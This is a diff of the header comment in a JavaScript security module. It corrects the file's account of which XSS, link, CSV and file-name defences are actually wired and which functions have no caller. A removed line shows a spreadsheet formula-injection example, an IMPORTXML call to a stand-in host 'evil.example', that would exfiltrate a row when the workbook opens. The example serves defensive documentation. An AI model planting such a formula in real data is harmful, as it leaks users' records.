@@ -5,13 +5,30 @@
  * never assigns `innerHTML`, so a stored string cannot become markup. This
  * file covers the three places where that guarantee does not reach.
  *
- * 1. **Rich text.** Notes store HTML by design. It is parsed and rebuilt from
- *    an allow-list, so a `<script>` or an `onclick` pasted from a web page is
- *    dropped rather than escaped-and-rendered.
- * 2. **Links.** A stored `javascript:` URL is a click away from running.
- * 3. **Spreadsheet cells.** A value beginning `=`, `+`, `-` or `@` is a
- *    formula to Sheets. `=IMPORTXML("evil.example", …)` in a payee name
- *    exfiltrates the row the moment somebody opens the workbook.
+ * 1. **Links.** A stored `javascript:` URL is a click away from running.
+ *    `safeUrl` is wired, in `js/modules/crud.js`.
+ * 2. **CSV export.** `escapeCsv`, wired in `js/reports/csv.js`.
+ * 3. **File names.** `safeFileName`, wired in `js/sync/drive.js` and
+ *    `js/reports/build.js`.
+ *
+ * ## What is here and is *not* wired, said plainly
+ *
+ * This header used to list rich text and spreadsheet cells as things "this
+ * file covers". Neither was true, and a security file describing a defence
+ * that does not run is worse than one that admits a gap.
+ *
+ *   - `sanitizeHtml` and `stripTags` have **no caller**. Nothing renders
+ *     stored HTML: `richtext` is edited in a plain `<textarea>` and drawn as a
+ *     text node, and `tools/lint.mjs` refuses any assignment to `innerHTML` in
+ *     what ships, which `tests/modules.test.mjs` proves fires. That structural
+ *     rule is the real defence and it is stronger than sanitising. These stay
+ *     for the day something does render markup — unwired, and now labelled.
+ *   - `escapeForSheet` and `unescapeFromSheet` have **no caller either**. The
+ *     formula-injection defence that actually runs is `defuse()` in
+ *     `apps-script/Sheets.gs`, on the server, whose own comment used to call
+ *     itself "the second line" of a defence whose first line was never built.
+ *     It is the only line, and `tests/backend.test.mjs` now tests it through
+ *     the deployed `.gs` rather than through these functions.
  */
 
 const ALLOWED_TAGS = new Set([
